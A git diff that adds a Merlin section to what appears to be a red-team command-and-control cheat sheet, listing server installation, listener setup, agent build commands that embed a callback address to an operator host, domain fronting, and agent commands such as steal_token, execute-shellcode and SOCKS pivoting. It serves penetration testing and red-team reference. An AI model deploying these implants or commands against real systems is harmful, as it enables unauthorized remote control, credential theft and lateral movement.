@@ -8,6 +8,7 @@
 - [Empire](#empire)
 - [Hak5 Cloud C2](#hak5-cloud-c2)
 - [Havoc](#havoc)
+- [Merlin](#merlin)
 - [Mythic](#mythic)
 - [Sliver](#sliver)
 
@@ -25,6 +26,8 @@
 | Havoc | The Havoc Framework | https://github.com/HavocFramework/Havoc |
 | KillDefenderBOF | Beacon Object File PoC implementation of KillDefender | https://github.com/Cerbersec/KillDefenderBOF |
 | Merlin | Merlin is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in golang. | https://github.com/Ne0nd0g/merlin |
+| Merlin Agent | Post-exploitation agent for Merlin | https://github.com/Ne0nd0g/merlin-agent |
+| Merlin Agent Dynamic Link Library (DLL) | This repository contains the very minimal C code file that is used to compile a Merlin agent into a DLL. | https://github.com/Ne0nd0g/merlin-agent-dll | 
 | MoveKit | Cobalt Strike kit for Lateral Movement | https://github.com/0xthirteen/MoveKit |
 | Mythic | A cross-platform, post-exploit, red teaming framework built with python3, docker, docker-compose, and a web browser UI. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout red teaming. | https://github.com/its-a-feature/Mythic |
 | Nightmangle | Nightmangle is post-exploitation Telegram Command and Control (C2/C&C) Agent, created by @1N73LL1G3NC3. | https://github.com/1N73LL1G3NC3x/Nightmangle |
@@ -248,6 +251,267 @@ user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/h
 
 ```c
 user@host:/opt/Havoc/Client$ ./Havoc
+```
+
+## Merlin
+
+> https://github.com/Ne0nd0g/merlin
+
+> https://github.com/Ne0nd0g/merlin-agent
+
+> https://github.com/Ne0nd0g/merlin-agent-dll
+
+> https://merlin-c2.readthedocs.io/en/latest/index.html
+
+### Installation
+
+```c
+$ mkdir /opt/merlin;cd /opt/merlin
+$ wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
+$ 7z x merlinServer-Linux-x64.7z
+$ sudo ./merlinServer-Linux-x64
+$ ./data/bin/merlinCLI-Linux-x64
+```
+
+### Service Configuration
+
+```c
+/etc/systemd/system/merlin.service
+```
+
+```c
+[Unit]
+Description=Merlin
+
+[Service]
+ExecStart=/PATH/TO/BINARY/merlinServer-Linux-x64
+Type=Simple
+
+[Install]
+WantedBy=multi-user.target
+```
+
+```c
+$ systemctl enable merlin.service
+$ systemctl start merlin.service
+```
+
+### Common Commands
+
+```c
+Merlin» help
+Merlin» main
+Merlin» ! <COMMAND>
+Merlin» jobs
+Merlin» queue
+Merlin» clear
+Merlin» modules
+Merlin» interact
+Merlin» listeners
+Merlin» sessions
+Merlin» socks
+Merlin» reconnect
+Merlin» remove
+```
+
+### Grouping
+
+```c
+Merlin» group add <AGENT> <GROUP>
+Merlin» list <GROUP> 
+Merlin» remove <AGENT> <GROUP>
+```
+
+### Listeners
+
+> https://merlin-c2.readthedocs.io/en/latest/cli/menu/listeners.html
+
+#### Common Commands
+
+```c
+Merlin[listeners]» list
+Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» status
+Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» start
+Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» stop
+Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» delete
+```
+
+#### Usage
+
+```c
+Merlin» listeners
+Merlin[listeners]» use https
+Merlin[listeners][HTTPS]» info
+Merlin[listeners][HTTPS]» set Interface 0.0.0.0
+Merlin[listeners][HTTPS]» set Port <LPORT>
+Merlin[listeners][HTTPS]» set PSK <PSK>
+Merlin[listeners][HTTPS]» run
+Merlin[listeners][HTTPS]» listeners
+Merlin[listeners]» list
+Merlin[listeners]» interact e2d9e800-78cc-4347-a232-ce767db508cd
+```
+
+### Agents
+
+> https://github.com/Ne0nd0g/merlin-agent
+
+> https://github.com/Ne0nd0g/merlin-agent-dll
+
+#### Agent Installation
+
+```c
+$ go install github.com/Ne0nd0g/merlin-agent@latest
+$ go install github.com/Ne0nd0g/merlin-agent-dll@latest
+```
+
+#### Agent Download
+
+```c
+$ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Windows-x64.7z
+$ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Linux-x64.7z
+$ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Darwin-x64.7z
+$ wget https://github.com/Ne0nd0g/merlin-agent-dll/releases/download/v2.2.0/merlin-agent-dll.7z
+```
+
+#### Build Commands
+
+```c
+$ make windows
+$ make linux
+$ make darwin
+$ make mips
+$ make arm
+```
+
+#### Custom Build Commands
+
+> https://merlin-c2.readthedocs.io/en/latest/agent/custom.html
+
+Please note that you have to be inside the `agent folder` for building agents.
+
+##### Basic Build with no Customization
+
+```c
+$ make windows DIR="./output"
+```
+
+###### Sample Output
+
+```c
+export GOOS=windows GOARCH=amd64;go build -trimpath -ldflags '-s -w -X "main.auth=opaque" -X "main.addr=127.0.0.1:4444" -X "main.transforms=jwe,gob-base" -X "main.listener=" -X "github.com/Ne0nd0g/merlin-agent/v2/core.Build=f0624a3082928d01eaa86a0fb101b0d1d72cde02" -X "main.protocol=h2" -X "main.url=https://127.0.0.1:443" -X "main.host=" -X "main.psk=merlin" -X "main.secure=false" -X "main.sleep=30s" -X "main.proxy=" -X "main.useragent=Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36" -X "main.headers=" -X "main.skew=3000" -X "main.padding=4096" -X "main.killdate=0" -X "main.maxretry=7" -X "main.parrot=" -H=windowsgui -buildid=' -gcflags=all=-trimpath= -asmflags=all=-trimpath= -o ./output/merlinAgent-Windows-x64.exe ./main.go
+```
+
+##### Custom Build with customized Parameters
+
+```c
+$ make windows ADDR="<LHOST>"  DIR="./output" AUTH="opaque" LISTENER="732e296e-7856-4914-961b-b4ba74972b54" KILLDATE="0" RETRY="10" PAD="4096" PROTO="h2" PSK="<PSK>" SKEW="3000" SLEEP="10s" URL="https://<LHOST>:<LPORT>/" USERAGENT="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
+```
+
+###### Sample Output
+
+```c
+export GOOS=windows GOARCH=amd64;go build -trimpath -ldflags '-s -w -X "main.auth=opaque" -X "main.addr=<LHOST>" -X "main.transforms=jwe,gob-base" -X "main.listener=732e296e-7856-4914-961b-b4ba74972b54" -X "github.com/Ne0nd0g/merlin-agent/v2/core.Build=f0624a3082928d01eaa86a0fb101b0d1d72cde02" -X "main.protocol=h2" -X "main.url=https://<LHOST>:<LPORT>/" -X "main.host=" -X "main.psk=<PSK>" -X "main.secure=false" -X "main.sleep=10s" -X "main.proxy=" -X "main.useragent=Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36" -X "main.headers=" -X "main.skew=3000" -X "main.padding=4096" -X "main.killdate=0" -X "main.maxretry=10" -X "main.parrot=" -H=windowsgui -buildid=' -gcflags=all=-trimpath= -asmflags=all=-trimpath= -o ./output/merlinAgent-Windows-x64.exe ./main.go
+```
+
+#### Common Commands
+
+```c
+Merlin» interact <AGENT>
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» checkin
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» clear
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» connect
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» info
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» status
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» note
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» maxretry
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» skew
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sleep
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» killdate
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» jobs
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» printenv
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ifconfig
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pwd
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» download
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» upload
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» nslookup
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ssh
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» rm
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sdelete
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» touch
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» exit
+```
+
+#### Linux Specific Commands
+
+```c
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memfd
+```
+
+#### Windows Specific Commands
+
+```c
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ps
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pipes
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» netstat
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» runas
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» make_token
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» steal_token
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» rev2self
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-clr
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» list-assemblies
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sharpgen
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory
+```
+
+#### Example Usage
+
+```c
+Merlin» listeners
+Merlin[listeners]» use https
+Merlin[listeners][HTTPS]» info
+Merlin[listeners][HTTPS]» set Interface 0.0.0.0
+Merlin[listeners][HTTPS]» set Port <LPORT>
+Merlin[listeners][HTTPS]» set PSK <PSK>
+Merlin[listeners][HTTPS]» run
+```
+
+```c
+Merlin» sessions
+```
+
+```c
+Merlin» interact 2711ef1d-0b53-490d-add9-7ae3c0878b07 
+Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» info
+```
+
+##### Fixing Error Message: Orphaned Agent JWT detected. Returning 401 instructing the Agent to generate a self-signed JWT and try again.
+
+```c
+Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» rev2self
+```
+
+#### Cloud Fronting
+
+```c
+$ make linux URL=http://<>DOMAIN/ HOST=<LHOST> PROTO=http PSK=<PSK>
+```
+
+### SOCKS Proxy
+
+```c
+Merlin» socks list
+Merlin» socks start <PORT> <AGENT>
+Merlin» socks stop <PORT> <AGENT>
 ```
 
 ## Mythic
